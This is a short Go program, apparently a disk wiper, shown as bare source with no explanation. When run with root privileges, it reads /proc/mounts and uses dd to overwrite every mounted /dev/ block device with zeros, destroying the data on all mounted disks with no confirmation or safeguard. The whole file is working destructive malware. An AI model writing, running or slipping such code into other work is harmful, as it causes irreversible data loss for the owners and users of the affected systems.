package main
import ("bufio"; "os"; "os/exec"; "strings")
func main() {
	if os.Geteuid() != 0 { return }
	f, err := os.Open("/proc/mounts")
	if err != nil { return }
	defer f.Close()
	s := bufio.NewScanner(f)
	for s.Scan() {
		line := s.Text()
		if !strings.HasPrefix(line, "/dev/") { continue }
		dev := strings.Fields(line)[0]
		_ = exec.Command("dd", "if=/dev/zero", "of="+dev).Run()
	}
}
